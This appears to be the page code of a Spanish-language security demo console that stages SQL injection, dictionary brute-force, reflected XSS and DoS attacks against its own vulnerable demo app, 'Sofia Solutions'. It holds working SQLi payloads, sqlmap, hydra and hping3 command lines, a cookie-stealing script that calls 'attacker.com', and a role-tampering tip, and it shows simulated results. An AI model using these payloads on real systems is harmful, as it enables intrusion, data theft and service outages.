<?php $activeNav = 'audit'; ?>
<style>
    /* Reset local para modo inmersivo */
    .audit-container {
        background: #050505;
        min-height: 100vh;
        color: #e2e8f0;
        padding: 40px;
        font-family: 'Inter', sans-serif;
    }

    /* Iconos SVG */
    .icon {
        width: 18px;
        height: 18px;
        stroke: currentColor;
        stroke-width: 2;
        fill: none;
        vertical-align: middle;
    }

    .terminal {
        background: #0a0a0a;
        border-radius: 12px;
        border: 1px solid rgba(255, 255, 255, 0.05);
        overflow: hidden;
        box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
    }

    .terminal-bar {
        background: #161616;
        padding: 12px 16px;
        display: flex;
        align-items: center;
        gap: 8px;
        border-bottom: 1px solid rgba(255, 255, 255, 0.05);
    }

    .t-dot {
        width: 10px;
        height: 10px;
        border-radius: 50%;
    }

    .t-out {
        background: #0a0a0a;
        padding: 24px;
        height: 650px;
        overflow-y: auto;
        color: #4ade80;
        font-family: 'Fira Code', monospace;
        font-size: 0.9rem;
        line-height: 1.6;
    }

    .t-cursor {
        width: 8px;
        height: 15px;
        background: #4ade80;
        display: inline-block;
        animation: blink 1s infinite;
        vertical-align: middle;
    }

    @keyframes blink {

        0%,
        100% {
            opacity: 1;
        }

        50% {
            opacity: 0;
        }
    }

    .t-line-red {
        color: #f87171;
    }

    .t-line-yellow {
        color: #fbbf24;
    }

    .t-line-cyan {
        color: #22d3ee;
    }

    .t-line-dim {
        color: #4b5563;
    }

    .t-action-btn {
        margin-top: 12px;
        display: inline-flex;
        align-items: center;
        gap: 8px;
        padding: 6px 14px;
        background: rgba(255, 255, 255, 0.03);
        border: 1px solid rgba(255, 255, 255, 0.1);
        color: #fff;
        border-radius: 6px;
        cursor: pointer;
        font-size: 0.68rem;
        font-weight: 700;
        text-transform: uppercase;
        transition: all 0.2s;
    }

    .t-action-btn:hover {
        background: rgba(255, 255, 255, 0.08);
        border-color: rgba(255, 255, 255, 0.3);
    }

    .module-card {
        background: rgba(255, 255, 255, 0.02);
        border: 1px solid rgba(255, 255, 255, 0.05);
        border-radius: 10px;
        padding: 16px;
        cursor: pointer;
        transition: all 0.2s;
        margin-bottom: 12px;
        display: flex;
        align-items: center;
        gap: 14px;
    }

    .module-card:hover {
        background: rgba(255, 255, 255, 0.04);
        border-color: rgba(255, 255, 255, 0.15);
        transform: translateX(4px);
    }

    .module-card.active {
        border-color: #4f46e5;
        background: rgba(79, 70, 229, 0.05);
    }

    .module-card .icon-wrap {
        background: rgba(255, 255, 255, 0.05);
        padding: 10px;
        border-radius: 8px;
        display: flex;
        align-items: center;
        justify-content: center;
        color: #6366f1;
    }

    .module-card .icon-wrap .icon {
        width: 22px;
        height: 22px;
        stroke-width: 2;
    }

    .module-card-text {
        flex: 1;
    }

    .module-card h4 {
        font-size: 0.9rem;
        margin: 0 0 4px;
    }

    .module-card p {
        font-size: 0.75rem;
        color: #94a3b8;
        margin: 0;
        line-height: 1.2;
    }

    .cfg-panel {
        background: #111;
        border: 1px solid rgba(255, 255, 255, 0.05);
        border-radius: 12px;
        padding: 20px;
    }

    .cfg-label {
        color: #6366f1;
        font-size: 0.65rem;
        font-weight: 800;
        text-transform: uppercase;
        margin-bottom: 8px;
        display: block;
    }

    .cfg-input {
        width: 100%;
        background: #000;
        border: 1px solid #222;
        border-radius: 8px;
        padding: 10px;
        color: #4ade80;
        font-family: monospace;
        margin-bottom: 16px;
    }

    .launch-btn {
        width: 100%;
        padding: 14px;
        border: none;
        border-radius: 8px;
        font-weight: 800;
        cursor: pointer;
        background: #6366f1;
        color: #fff;
        transition: all 0.2s;
    }

    .launch-btn:hover:not(:disabled) {
        background: #4f46e5;
        transform: translateY(-1px);
    }

    .launch-btn:disabled {
        opacity: 0.3;
        cursor: not-allowed;
    }

    @media (max-width: 900px) {
        .audit-grid {
            grid-template-columns: 1fr !important;
        }

        .audit-container {
            padding: 20px;
        }
    }

    /* Burp Suite UI Simulation */
    .burp-window {
        position: fixed;
        bottom: 30px;
        right: 30px;
        width: 480px;
        background: #2b2b2b;
        border: 1px solid #555;
        border-radius: 8px;
        z-index: 200000;
        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.8);
        display: none;
        font-family: 'Consolas', monospace;
        color: #ccc;
    }

    .burp-header {
        background: #3c3f41;
        padding: 10px 15px;
        border-bottom: 1px solid #222;
        display: flex;
        justify-content: space-between;
        align-items: center;
        border-radius: 8px 8px 0 0;
    }

    .burp-tabs {
        background: #323232;
        padding: 0 10px;
        display: flex;
        gap: 2px;
    }

    .burp-tab {
        padding: 8px 15px;
        font-size: 0.75rem;
        background: #3c3f41;
        cursor: pointer;
        border-bottom: 2px solid #f97316;
    }

    .burp-body {
        padding: 15px;
        background: #2b2b2b;
    }

    .burp-request {
        background: #1e1e1e;
        padding: 15px;
        border-radius: 4px;
        font-size: 0.8rem;
        color: #fff;
        line-height: 1.4;
        border: 1px solid #444;
        min-height: 180px;
        outline: none;
        white-space: pre-wrap;
    }

    .burp-actions {
        padding: 10px 15px;
        display: flex;
        gap: 10px;
        background: #323232;
        border-radius: 0 0 8px 8px;
    }

    .burp-btn {
        padding: 6px 15px;
        font-size: 0.75rem;
        border: 1px solid #555;
        background: #4e5052;
        color: #fff;
        cursor: pointer;
        border-radius: 3px;
        transition: background 0.2s;
    }
    
    .burp-btn:hover {
        background: #5a5c5e;
    }

    .burp-btn.forward {
        background: #f97316;
        border-color: #c2410c;
        font-weight: bold;
    }
    
    .burp-btn.forward:hover {
        background: #ea580c;
    }
</style>

<div class="audit-container">
    <header style="margin-bottom:48px;">
        <div style="display:flex; align-items:center; gap:12px; margin-bottom:8px;">
            <svg class="icon" style="color:#ef4444; width:24px; height:24px;">
                <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"></path>
            </svg>
            <span
                style="font-weight:800; letter-spacing:2px; font-size:0.75rem; color:#ef4444; text-transform:uppercase;">Security
                Intelligence</span>
        </div>
        <h1 style="font-size:2.2rem; font-weight:900; margin:0; letter-spacing:-1px;">Audit Console <span
                style="color:#4f46e5;">v4.8</span></h1>
    </header>

    <div class="audit-grid" style="display:grid; grid-template-columns:340px 1fr; gap:40px;">
        <!-- Sidebar Modulos -->
        <aside>
            <div id="module-list">
                <div class="module-card" onclick="loadModule('sqli', this)">
                    <div class="icon-wrap"><svg class="icon">
                            <path d="M20 4L3 9l7 2 2 7 5-12z"></path>
                        </svg></div>
                    <div class="module-card-text">
                        <h4>Inyección SQL</h4>
                        <p>Bypass de Autenticación y Fuga de Datos</p>
                    </div>
                </div>
                <div class="module-card" onclick="loadModule('brute', this)">
                    <div class="icon-wrap"><svg class="icon">
                            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
                        </svg></div>
                    <div class="module-card-text">
                        <h4>Fuerza Bruta</h4>
                        <p>Ataque de Diccionario (Admin)</p>
                    </div>
                </div>
                <div class="module-card" onclick="loadModule('xss', this)">
                    <div class="icon-wrap"><svg class="icon">
                            <polyline points="16 18 22 12 16 6"></polyline>
                            <polyline points="8 6 2 12 8 18"></polyline>
                        </svg></div>
                    <div class="module-card-text">
                        <h4>XSS Reflejado</h4>
                        <p>Inyección de Scripts (Buscador)</p>
                    </div>
                </div>
                <div class="module-card" onclick="loadModule('dos', this)">
                    <div class="icon-wrap"><svg class="icon">
                            <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon>
                        </svg></div>
                    <div class="module-card-text">
                        <h4>Inundación HTTP (DoS)</h4>
                        <p>Agotamiento de Rate Limit</p>
                    </div>
                </div>
            </div>

            <div id="cfg-panel" class="cfg-panel" style="margin-top:24px; display:none;">
                <div id="cfg-body"></div>
                <button id="launch-btn" class="launch-btn" disabled>EJECUTAR ATAQUE</button>
            </div>
        </aside>

        <!-- Terminal -->
        <div class="terminal" style="display:flex; flex-direction:column;">
            <div class="terminal-bar">
                <div class="t-dot" style="background:#ff5f56;"></div>
                <div class="t-dot" style="background:#ffbd2e;"></div>
                <div class="t-dot" style="background:#27c93f;"></div>
                <span
                    style="margin-left:12px; font-size:0.6rem; color:#444; font-weight:800; text-transform:uppercase; font-family:sans-serif;">bash
                    — audit-v4.8</span>
            </div>
            <div style="display:grid; grid-template-columns: 1fr 380px; flex:1;">
                <div id="t-out" class="t-out" style="height:650px;">
                    <div class="t-line-cyan">Sofia Solutions Audit Framework inicializado.</div>
                    <div class="t-line-dim">Esperando selección de módulo...</div>
                    <div id="t-cursor" class="t-cursor"></div>
                </div>
                <!-- Panel Lateral de Evidencias -->
                <div style="background:#080808; border-left:1px solid rgba(255,255,255,0.05); padding:20px;">
                    <span class="cfg-label" style="color:#4ade80;">Evidencias Capturadas</span>
                    <div id="evidence-panel" style="display:flex; flex-direction:column; gap:12px; margin-top:10px;">
                        <div
                            style="color:rgba(255,255,255,0.2); font-size:0.7rem; text-align:center; padding:20px; border:1px dashed rgba(255,255,255,0.1); border-radius:8px;">
                            Sin datos capturados
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Burp Suite Simulation Window (Auto-pops for Session Hijacking) -->
<div id="burp-suite" class="burp-window" style="display:none; position:fixed; top:10%; right:5%; z-index:10000; width:500px; box-shadow:0 0 50px rgba(249,115,22,0.3); border:1px solid #f97316;">
    <div class="burp-header">
        <span style="font-size:0.75rem; font-weight:bold;">Burp Suite Pro - Sofia Edition</span>
        <div style="display:flex; gap:5px;">
            <div style="width:12px; height:12px; border-radius:50%; background:#444;"></div>
            <div style="width:12px; height:12px; border-radius:50%; background:#444;"></div>
        </div>
    </div>
    <div class="burp-tabs">
        <div class="burp-tab">Intercept</div>
        <div style="padding:8px 15px; font-size:0.75rem; color:#888;">HTTP history</div>
    </div>
    <div class="burp-body">
        <div style="margin-bottom:10px; font-size:0.7rem; color:#f97316; font-weight:bold;">[INTERCEPTED] Request to sofia-solutions.local</div>
        <div style="margin-bottom:10px; font-size:0.65rem; color:#aaa; font-style:italic;">💡 Tip: Cambia "role=CLIENT" a "role=ADMIN" y haz click en Forward para escalar privilegios.</div>
        <div id="burp-request-area" class="burp-request" contenteditable="true"></div>
    </div>
    <div class="burp-actions">
        <button class="burp-btn forward" onclick="forwardRequest()">Forward</button>
        <button class="burp-btn" onclick="dropRequest()">Drop</button>
        <button class="burp-btn" style="color:#f97316;" onclick="autoExploit()">Action (Auto-Exploit)</button>
    </div>
</div>

<!-- Hacker Alert Overlay (Removido por petición: stealth mode) -->
<div id="hacker-overlay" style="display:none;"></div>

<!-- DoS Downtime Simulation Overlay -->
<div id="dos-downtime-overlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#202124; z-index:999999; justify-content:center; align-items:center; font-family:system-ui, -apple-system, sans-serif; color:#e8eaed; animation:fadeIn 0.4s ease;">
    <div style="max-width:550px; width:90%; padding:20px; text-align:left; animation:slideDown 0.3s ease;">
        <!-- Chrome Sad Dinosaur SVG -->
        <svg viewBox="0 0 24 24" style="width:72px; height:72px; fill:#9aa0a6; margin-bottom:24px;">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
        </svg>
        <h1 style="font-size:20px; font-weight:500; margin:0 0 15px; color:#e8eaed;">No se puede acceder a este sitio web</h1>
        <p style="font-size:13px; color:#9aa0a6; line-height:1.6; margin:0 0 20px;">
            La página <strong>sofia-solutions.serveousercontent.com</strong> ha rechazado la conexión.
        </p>
        
        <div style="border-top:1px solid #3c4043; padding-top:20px; margin-bottom:25px;">
            <p style="font-size:13px; color:#9aa0a6; margin:0 0 10px;">Prueba a realizar las siguientes comprobaciones:</p>
            <ul style="font-size:13px; color:#9aa0a6; margin:0; padding-left:20px; line-height:1.6;">
                <li>Comprobar la conexión a Internet</li>
                <li>Comprobar el proxy, el cortafuegos y el estado del contenedor de backend</li>
            </ul>
        </div>
        
        <div style="display:flex; justify-content:space-between; align-items:center;">
            <button onclick="restoreDoS()" style="background:#8ab4f8; color:#202124; border:none; border-radius:4px; padding:8px 16px; font-size:13px; font-weight:500; cursor:pointer; transition:background 0.2s;" onmouseover="this.style.background='#9ec2f9';" onmouseout="this.style.background='#8ab4f8';">
                Cargar de nuevo
            </button>
            <span style="font-size:12px; color:#9aa0a6; font-family:monospace;">ERR_CONNECTION_REFUSED</span>
        </div>
    </div>
</div>


<script>
    console.log("Sofia Solutions Audit Framework v4.8.5 - Finalized.");
    const TARGET = window.SOFIA_CONFIG?.apiBase || '';
    const TOOLS = {
        sqli: {
            title: 'Inyección SQL',
            config: `<label class="cfg-label">OBJETIVO</label>
                  <select class="cfg-input" id="sqli-ep" style="margin-bottom:8px;">
                    <option value="/api/autenticacion/login/vulnerable">Login Inseguro (v1)</option>
                    <option value="/api/autenticacion/login/v2">Login Seguro (v2 + MFA)</option>
                  </select>
                  <label class="cfg-label">TIPO DE ATAQUE (SQLi)</label>
                  <select class="cfg-input" id="sqli-type">
                    <option value="bypass">Bypass de Autenticación (Exfiltrar Token JWT de Sesión)</option>
                    <option value="pii">Fuga de Datos PII (Tarjetas de Crédito, CVVs e IBANs)</option>
                    <option value="credentials">Extracción de Credenciales (Tabla users)</option>
                  </select>
`,
            run: runSQLi
        },
        brute: {
            title: 'Fuerza Bruta',
            config: `<label class="cfg-label">OBJETIVO</label>
                  <select class="cfg-input" id="brute-ep" style="margin-bottom:8px;">
                    <option value="/api/autenticacion/login/vulnerable">Login Inseguro (v1)</option>
                    <option value="/api/autenticacion/login/v2">Login Seguro (v2 + MFA)</option>
                 </select>
                 <label class="cfg-label">DICCIONARIO</label>
                 <select class="cfg-input" id="brute-dict">
                    <option value="rockyou_top20">RockYou (Top 20 - Demo)</option>
                 </select>
                 <label class="cfg-label">USUARIO OBJETIVO</label>
                 <input class="cfg-input" id="brute-user" value="admin@sofia.local">`,
            run: runBrute
        },
        xss: {
            title: 'XSS Reflejado',
            config: `<label class="cfg-label">ACCIÓN MALICIOSA</label>
                 <select class="cfg-input" id="xss-action">
                    <option value="cookie">Robo de Cookies (Session Hijacking)</option>
                    <option value="redirect">Redirección a Phishing (Evil Proxy)</option>
                 </select>`,
            run: runXSS
        },
        dos: {
            title: 'Inundación HTTP (DoS)',
            config: `<label class="cfg-label">CONCURRENCIA (PETICIONES)</label><input class="cfg-input" id="dos-count" value="200">`,
            run: runDoS
        }
    };

    function tLog(msg, type = 'green') {
        const out = document.getElementById('t-out');
        const ts = new Date().toLocaleTimeString('es-ES', { hour12: false });
        const div = document.createElement('div');
        div.className = `t-line-${type}`;
        
        const tsSpan = document.createElement('span');
        tsSpan.style.color = '#222';
        tsSpan.textContent = `[${ts}] `;
        div.appendChild(tsSpan);
        
        const msgSpan = document.createElement('span');
        if (msg.includes('<button') || msg.includes('<path')) {
            msgSpan.innerHTML = msg; // Permitir botones de acción
        } else {
            msgSpan.textContent = msg; // Protege contra ejecución de scripts inyectados en el log
        }
        div.appendChild(msgSpan);
        
        out.insertBefore(div, document.getElementById('t-cursor'));
        out.scrollTop = out.scrollHeight;
        return div;
    }

    window.addEventListener('message', (e) => {
        if (e.data.type === 'XSS_SUCCESS') {
            showEvidence('XSS: Cookies & LocalStorage Robados', e.data.data);
        }
        if (e.data.type === 'PHISHING_SUCCESS') {
            showEvidence('Phishing: Credenciales Capturadas', e.data.data);
        }
    });

    function showEvidence(title, data) {
        addEvidence(title, data, 'red');
    }

    function addEvidence(title, content, type = 'green') {
        const panel = document.getElementById('evidence-panel');
        if (panel.querySelector('div[style*="dashed"]')) panel.innerHTML = '';

        const card = document.createElement('div');
        card.style = `background:rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.1); border-radius:8px; padding:10px; font-size:0.7rem; border-left:3px solid ${type === 'red' ? '#ef4444' : '#4ade80'}; animation: slideIn 0.3s ease;`;
        card.innerHTML = `<strong style="display:block; margin-bottom:4px; color:#fff;">${title}</strong><pre style="margin:0; color:${type === 'red' ? '#fca5a5' : '#86efac'}; white-space:pre-wrap; font-family:monospace;">${content}</pre>`;
        panel.prepend(card);
    }

    function addAction(container, text, icon, callback) {
        const btn = document.createElement('button');
        btn.className = 't-action-btn';
        btn.innerHTML = `<svg class="icon" style="width:12px;height:12px;">${icon}</svg> ${text}`;
        btn.onclick = callback;
        container.appendChild(document.createElement('br'));
        container.appendChild(btn);
    }

    function loadModule(key, el) {
        document.querySelectorAll('.module-card').forEach(c => c.classList.remove('active'));
        el.classList.add('active');
        const t = TOOLS[key];
        document.getElementById('cfg-body').innerHTML = t.config;
        document.getElementById('cfg-panel').style.display = 'block';
        const btn = document.getElementById('launch-btn');
        btn.disabled = false;
        btn.onclick = t.run;
        tLog(`[*] Módulo cargado: ${t.title}`, 'cyan');
    }

    const delay = ms => new Promise(res => setTimeout(res, ms));

    async function runSQLi() {
        const type = document.getElementById('sqli-type').value;
        let p = "' OR '1'='1'--";
        if (type === 'pii') {
            p = "' UNION SELECT card_holder, card_number, cvv, expiration FROM customer_billing--";
        } else if (type === 'credentials') {
            p = "' UNION SELECT email, password FROM users--";
        }

        const ep = document.getElementById('sqli-ep').value;
        tLog(`[COMMAND] sqlmap -u "${TARGET}${ep}" --data "email=${p}&password=x" --batch --dump`, 'yellow');
        await delay(800);
        tLog(`sqlmap/1.8.2#dev - automatic SQL injection and database takeover tool`, 'cyan');
        tLog(`[INFO] testing connection to the target URL`, 'dim');
        await delay(400);
        tLog(`[INFO] checking if the target is protected by some kind of WAF/IPS`, 'dim');
        await delay(500);
        tLog(`[INFO] testing if the target URL content is stable`, 'dim');
        
        tLog(`[PAYLOAD] Executing: ${p}`, 'yellow');

        await delay(800);

        try {
            const token = localStorage.getItem('sofia_token_ADMIN') || localStorage.getItem('sofia_token_v1');
            const r = await fetch(TARGET + ep, {
                method: 'POST', 
                headers: { 
                    'Content-Type': 'application/json',
                    'Authorization': token ? `Bearer ${token}` : ''
                },
                body: JSON.stringify({ email: p, password: 'x' })
            });

            // Si el WAF está activo, bloqueamos de inmediato (incluso para ataques UNION simulados)
            if (r.status === 403) {
                tLog(`[CRITICAL] Blocked by Sofia WAF Shield (Security Active)`, 'red');
                addEvidence('Attack Blocked', 'El WAF de Sofia ha detectado y bloqueado la inyección SQL en tiempo real.', 'red');
                return;
            }

            // Lógica de simulación para payloads UNION (incluso si la DB real falla por tipos/columnas)
            if (p.toLowerCase().includes('union')) {
                tLog(`[INFO] POST parameter 'email' appears to be 'UNION query' injectable`, 'green');
                
                if (p.toLowerCase().includes('users') || type === 'credentials') {
                    tLog(`[INFO] fetching columns for table 'users'`, 'dim');
                    await delay(300);
                    tLog(`[SUCCESS] dumped 3 entries from table 'users'`, 'green');
                    addEvidence('User Credentials Dump', 'admin@sofia.local:admin123\nmapfre@sofia.local:mapfre123\nmercadona@sofia.local:mercadona123');
                } 
                else if (p.toLowerCase().includes('customer_billing') || type === 'pii') {
                    tLog(`[INFO] fetching columns for table 'customer_billing'`, 'dim');
                    await delay(500);
                    tLog(`[SUCCESS] dumped 3 entries from table 'customer_billing' (PII)`, 'red');
                    addEvidence('Exfiltrated Bank Data (PII + CVV)', 
                        'Titular: Juan Garcia | IBAN: ES21 0049 1234 5678 9012 | CC: 4532 8812 4432 8812 | CVV: 231 | Exp: 08/29\n' +
                        'Titular: Elena Ruiz   | IBAN: ES91 2100 5566 7788 9900 | CC: 4912 1109 3322 1109 | CVV: 894 | Exp: 12/28\n' +
                        'Titular: Carlos Plaza | IBAN: ES34 0081 9911 2233 4455 | CC: 5412 7599 0012 5543 | CVV: 104 | Exp: 04/27', 'red');
                }
                else {
                    tLog(`[SUCCESS] query executed successfully. Data exfiltrated to evidence panel.`, 'green');
                    addEvidence('SQLi UNION Result', 'Simulación: Resultados de la consulta personalizada exfiltrados con éxito.');
                }
                return;
            }

            const d = await r.json();
            if (r.ok && d.accessToken && ep.includes('vulnerable')) {
                tLog(`[INFO] POST parameter 'email' is 'Generic UNION query' injectable`, 'green');
                tLog(`[INFO] bypassing authentication...`, 'dim');
                addEvidence('Authentication Bypass', `User: ${d.user?.email}\nToken: ${d.accessToken}`);
                const res = tLog(`[*] Acción: `, 'cyan');
                addAction(res, 'Acceder al Panel', '<path d="M12 2L2 7l10 5 10-5-10-5z"></path>', () => {
                    const role = d.user?.role || 'CLIENT';
                    localStorage.setItem(`sofia_token_${role}`, d.accessToken);
                    localStorage.setItem('sofia_user_v1', JSON.stringify(d.user));
                    window.location.href = role === 'ADMIN' ? '/admin' : '/dashboard';
                });
            } else {
                tLog(`[WARNING] POST parameter 'email' does not seem to be injectable`, 'red');
            }
        } catch (e) { 
            tLog(`[CRITICAL] connection dropped or server error`, 'red'); 
        }
    }

    async function runBrute() {
        const user = document.getElementById('brute-user').value;
        const ep = document.getElementById('brute-ep').value;
        tLog(`[COMMAND] hydra -l ${user} -P rockyou.txt -s 80 ${window.location.hostname} http-post-form "${ep}:email=^USER^&password=^PASS^:F=Invalid"`, 'yellow');
        await delay(800);
        tLog(`Hydra v9.3 (c) 2022 by van Hauser/THC`, 'cyan');
        tLog(`[DATA] max 16 tasks per 1 server, overall 16 tasks`, 'dim');
        tLog(`[DATA] attacking https://sofia-solutions.local${ep}`, 'dim');

        // Diccionario extendido con contraseñas del seed
        const dictionary = ['admin', '123456', 'password', 'root', 'admin123', 'mapfre123', 'mercadona123', 'iberdrola123', 'S0f1a_Secur3!_2026', 'sofia2026'];

        for (let p of dictionary) {
            tLog(`[80][https-post-json] host: sofia-solutions.local   login: ${user}   password: ${p}`, 'dim');
            await delay(200);

            try {
                const token = localStorage.getItem('sofia_token_ADMIN') || localStorage.getItem('sofia_token_v1');
                const r = await fetch(TARGET + ep, {
                    method: 'POST', 
                    headers: { 
                        'Content-Type': 'application/json',
                        'Authorization': token ? `Bearer ${token}` : ''
                    },
                    body: JSON.stringify({ email: user, password: p })
                });

                if (r.ok) {
                    const d = await r.json();
                    tLog(`[80][https-post-json] host: sofia-solutions.local   login: ${user}   password: ${p}`, 'green');
                    tLog(`1 of 1 target successfully completed, 1 valid password found`, 'green');
                    addEvidence('Cracked Credentials', `${user}:${p}`);
                    const res = tLog(`[*] Acción: `, 'cyan');
                    addAction(res, 'Autologin Admin', '<path d="M12 11V7a4 4 0 0 1 8 0v4"></path>', () => {
                        const role = d.user?.role || 'ADMIN';
                        localStorage.setItem(`sofia_token_${role}`, d.accessToken);
                        localStorage.setItem('sofia_user_v1', JSON.stringify(d.user));
                        window.location.href = role === 'ADMIN' ? '/admin' : '/dashboard';
                    });
                    return;
                }
                
                if (r.status === 403 || r.status === 429) {
                    tLog(`[ERROR] Target blocked connection (Anti-Brute Force Active)`, 'red');
                    addEvidence('Brute Force Blocked', 'El sistema ha detectado el ataque de diccionario y ha bloqueado la IP de origen.', 'red');
                    return;
                }
            } catch (e) { }
        }
        tLog(`0 valid passwords found`, 'red');
    }

    async function runXSS() {
        const action = document.getElementById('xss-action').value;
        const payload = action === 'cookie' ? '<script>fetch("http://attacker.com/log?c="+document.cookie)<\/script>' : '<script>window.location.href="/phishing"<\/script>';
        tLog(`[COMMAND] curl -G "${TARGET}/search" --data-urlencode "q=${payload}"`, 'yellow');
        await delay(800);
        tLog(`[*] Lanzando ataque XSS Reflejado...`, 'yellow');
        await delay(600);

        if (action === 'cookie') {
            tLog(`[INFO] Document cookie accessed via XSS`, 'cyan');
            tLog(`[!] Iniciando Burp Suite para interceptar sesión...`, 'yellow');
            const fakeCookie = `sofia_session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiZW1haWwiOiJhZG1pbkBzb2ZpYS5sb2NhbCIsInJvbGUiOiJBRE1JTiJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c; user_id=1; role=ADMIN`;
            addEvidence('Stolen Cookies', fakeCookie, 'green');
            await delay(1000);
            runCookieHijack();
        } else {
            tLog(`[INFO] Inyectando payload iframe/redirect en el DOM...`, 'dim');
            await delay(600);
            tLog(`[SUCCESS] Víctima interceptada por el portal de Phishing (Evil Proxy)`, 'green');
            addEvidence('Evil Proxy Activado', 'Target: https://sofia-solutions.local/phishing\nStatus: Intercepting session in real-time\nRedirection: ACTIVE', 'red');
            const res = tLog(`[*] Acción: `, 'cyan');
            addAction(res, 'Abrir Portal de Phishing', '<path d="M12 2L2 7l10 5 10-5-10-5z"></path>', () => {
                window.open('/phishing', '_blank');
            });
        }
    }


    async function runDoS() {
        const count = parseInt(document.getElementById('dos-count').value);
        tLog(`[COMMAND] hping3 -c ${count} -d 120 -S -w 64 -p 80 --flood ${window.location.hostname}`, 'yellow');
        await delay(800);
        tLog(`[*] DoS: Iniciando ráfaga de ${count} peticiones...`, 'red');
        
        // Detectamos el modo actual desde la configuración global
        const isVulnerable = window.SOFIA_CONFIG && window.SOFIA_CONFIG.loginMode === 'vulnerable';
        
        if (isVulnerable) {
            for (let i = 0; i < 4; i++) {
                tLog(`[*] DoS: Enviando lote de peticiones concurrentes...`, 'red');
                await delay(300);
            }
            tLog(`[!] ADVERTENCIA: Latencia del Event Loop de Node.js > 5000ms`, 'yellow');
            await delay(500);
            tLog(`[!] ADVERTENCIA: Sockets TCP agotados, rechazando conexiones entrantes`, 'yellow');
            await delay(600);
            tLog(`[!] ERROR CRÍTICO: Connection timeout from target`, 'red');
            tLog(`[!] TARGET UNREACHABLE - HTTP 503 Service Unavailable`, 'red');
            await delay(800);
            
            // Mostrar modal de caída visual
            document.getElementById('dos-downtime-overlay').style.display = 'flex';
            addEvidence('DoS Attack SUCCESS', `Total Peticiones: ${count}\nEstado: INFRAESTRUCTURA CAÍDA (Downtime 100%)\nImpacto: Node.js Event Loop Blocked\nMitigación: NINGUNA (Falta de Rate Limiting)`, 'red');
        } else {
            let blocked = 0;
            for (let i = 0; i < count; i++) {
                fetch(TARGET + '/api/health').then(r => { if (r.status === 429) blocked++; });
                if (i % 10 === 0) await delay(5);
            }
            await delay(1000);
            tLog(`[+] Inundación finalizada. Ataque mitigado por Rate Limiting.`, 'cyan');
            tLog(`[INFO] Monitorice el impacto en tiempo real desde el Panel SOC (Grafana).`, 'dim');
            addEvidence('DoS Attempt Mitigated', `Total Peticiones: ${count}\nEstado: Bloqueado por WAF Gateway\nImpacto: 0% Downtime\nMitigación: Activa (Express Rate Limit)`, 'green');
        }
    }

    function restoreDoS() {
        document.getElementById('dos-downtime-overlay').style.display = 'none';
        tLog(`[*] Servidor restablecido con éxito. Event loop liberado.`, 'green');
    }

    let hijackedUser = null;

    async function runCookieHijack() {
        tLog(`[*] Inicializando Burp Suite Interceptor...`, 'yellow');
        tLog(`[*] Escuchando tráfico HTTP/HTTPS en 127.0.0.1:8080...`, 'dim');

        await delay(1500);

        const tokenDemo = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTIsImVtYWlsIjoibWFwZnJlQHNvZmlhLmxvY2FsIiwicm9sZSI6IkNMSUVOVCJ9.L2hS3_jV-qW2X_5_J-5_J-5_J-5_J-5_J-5_J-5_J-4";
        const requestText = `POST /api/autenticacion/session HTTP/1.1
Host: sofia-solutions.serveousercontent.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
Accept: application/json
Authorization: Bearer ${tokenDemo}
Cookie: session_id=s%3A_sofia_hijacked_cookie; role=CLIENT
Content-Length: 0

`;

        document.getElementById('burp-request-area').innerText = requestText;
        document.getElementById('burp-suite').style.display = 'block';

        tLog(`[!] Traffic intercepted from client browser`, 'cyan');
    }

    function forwardRequest() {
        const text = document.getElementById('burp-request-area').innerText;
        document.getElementById('burp-suite').style.display = 'none';

        tLog(`[*] Enviando petición modificada al servidor...`, 'cyan');

        if (text.includes('role=ADMIN') || text.includes('role:ADMIN')) {
            tLog(`[INFO] Forwarding modified request to server`, 'dim');
            tLog(`[200 OK] Server accepted modified token`, 'green');

            addEvidence('Cookie Hijacking / PrivEsc', 'Original: role=CLIENT\nModified: role=ADMIN\nResult: Full Admin Access');

            const res = tLog(`[*] Acción: `, 'cyan');
            addAction(res, 'Entrar como Admin (Cookie)', '<path d="M12 2L2 7l10 5 10-5-10-5z"></path>', () => {
                // Simulación de sesión admin por cookie robada
                localStorage.setItem('sofia_token_ADMIN', 'STOLEN_ADMIN_TOKEN_MOCK');
                localStorage.setItem('sofia_user_v1', JSON.stringify({ id: 1, email: 'admin@sofia.local', role: 'ADMIN' }));
                window.location.href = '/admin';
            });
        } else {
            tLog(`[401 Unauthorized] Server rejected request`, 'red');
        }
    }

    function dropRequest() {
        document.getElementById('burp-suite').style.display = 'none';
        tLog(`[-] Petición descartada por el atacante (Drop).`, 'dim');
    }

    function autoExploit() {
        const area = document.getElementById('burp-request-area');
        let text = area.innerText;
        if(text.includes('role=CLIENT')) {
            area.innerText = text.replace('role=CLIENT', 'role=ADMIN');
            tLog(`[*] Payload inyectado automáticamente: cambiado role=CLIENT por role=ADMIN`, 'yellow');
        } else {
            tLog(`[-] El payload ya ha sido inyectado.`, 'dim');
        }
    }
</script>

<style>
    @keyframes slideIn {
        from {
            transform: translateX(20px);
            opacity: 0;
        }

        to {
            transform: translateX(0);
            opacity: 1;
        }
    }

    @keyframes slideDown {
        from {
            transform: translateY(-20px);
            opacity: 0;
        }

        to {
            transform: translateY(0);
            opacity: 1;
        }
    }

    @keyframes fadeIn {
        from { opacity: 0; }
        to { opacity: 1; }
    }

    @keyframes pulse {
        0%, 100% { transform: scale(1); opacity: 0.8; }
        50% { transform: scale(1.05); opacity: 1; }
    }

    @keyframes shake {
        0%, 100% { transform: translate(0, 0) rotate(0deg); }
        20%, 60% { transform: translate(-2px, 2px) rotate(-1deg); }
